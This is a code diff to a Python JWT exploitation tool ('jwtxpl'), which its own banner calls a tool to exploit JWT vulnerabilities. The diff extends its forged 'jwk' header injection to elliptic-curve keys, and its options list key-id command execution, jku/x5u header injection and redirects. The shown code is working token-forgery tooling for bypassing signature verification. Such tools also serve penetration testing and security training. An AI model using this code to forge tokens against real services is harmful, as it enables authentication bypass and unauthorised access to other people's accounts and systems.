@@ -76,14 +76,14 @@ class Cracker:
     usage = """
         python3 jwt-crack.py <token> [OPTIONS]; OR
         jwtxpl <token> [OPTIONS]; IF YOU HAVE USED install.sh
-	"""
+    """
     command = ["jwtxpl"] + [sys.argv[i] for i in range(1, len(sys.argv))]
 
     output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
 {Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
 {Bcolors.HEADER}Author:{Bcolors.ENDC} {Bcolors.OKCYAN}{__author__}{Bcolors.ENDC}
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
-        """
+    """
 
     def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                  specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, verify_token_with,
@@ -583,8 +583,13 @@ class Cracker:
             url = self.x5u_header_injection.replace("HERE", injection)
             header_dict['x5u'] = url
         elif self.generate_jwk:
-            crafted_jwk = Cracker.generate_jwk(self.n, self.e, "identifier")
-            header_dict['jwk'] = crafted_jwk
+            jwk_id = header_dict['kid'] if 'kid' in header_dict.keys() else "identifier"
+            if self.alg[:2] in ["RS", "PS"]:
+                numbers = [self.key.pub.n, self.key.pub.e]
+            elif self.alg[:2] == "ES":
+                numbers = [self.key.pub.x, self.key.pub.y]
+            crafted_jwk = Cracker.generate_jwk(jwk_id, numbers, jwa=self.alg)
+            header_dict = Cracker.embed_jwk_in_jwt_header(header_dict, crafted_jwk)
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
@@ -1535,23 +1540,27 @@ class Cracker:
         return key
 
     @staticmethod
-    def generate_jwk(n, e, kid):
+    def generate_jwk(kid, public_numbers, jwa="RS256"):
         """
         Generation of a jwk claim
-
-        :param n: The modulus of the public key -> str
-        :param e: The exponent of the publc key -> str
         :param kid: The key identifier -> str
+        :param public_numbers: The public key public numbers -> list
+        :param jwa: The json web algorithm -> str
 
         :return: The generated jwk
         """
         jwk = dict()
-        jwk['kty'] = "RSA"
+        if jwa[:2] in ["RS", "PS"]:
+            jwk['kty'] = "RSA"
+            jwk['n'] = public_numbers[0]
+            jwk['e'] = public_numbers[1]
+        elif jwa[:2] == "ES":
+            jwk['kty'] = "EC"
+            jwk['x'] = public_numbers[0]
+            jwk['y'] = public_numbers[1]
         jwk['kid'] = kid
         jwk['use'] = "sig"
-        jwk['n'] = n
-        jwk['e'] = e
-        jwk['alg'] = "RS256"
+        jwk['alg'] = jwa
         return jwk
 
     @staticmethod
@@ -1562,7 +1571,9 @@ class Cracker:
 
         :return: The modified header dictionary
         """
-        iterable['jwk'] = jwk
+        if 'keys' not in iterable.keys():
+            iterable['keys'] = list()
+        iterable['keys'].insert(0, jwk)
         return iterable
 
     def run(self):
